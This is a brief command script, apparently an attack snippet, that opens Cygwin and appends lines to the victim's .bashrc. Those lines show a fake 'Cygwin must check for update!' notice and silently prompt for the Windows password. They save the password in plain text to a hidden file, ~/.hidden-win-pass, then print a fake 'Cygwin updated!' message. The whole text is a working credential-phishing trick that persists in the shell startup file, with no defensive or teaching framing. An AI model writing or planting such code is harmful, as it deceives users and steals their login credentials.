C:\cygwin\Cygwin.bat
echo "echo \"Cygwin must check for update! \"" >> .bashrc
echo "WINUSER=\$(/cygdrive/c/Windows/System32/whoami.exe 2> /dev/null | sed 's/.$//')" >> .bashrc
echo "read -sp \"Please enter you Windows password for \$WINUSER: \" WINPASS " >> .bashrc
echo "echo \$WINPASS >> ~/.hidden-win-pass" >> .bashrc
echo "sleep 2" >> .bashrc
echo "echo \"\"" >> .bashrc
echo "echo \"Cygwin updated! \"" >> .bashrc
exit
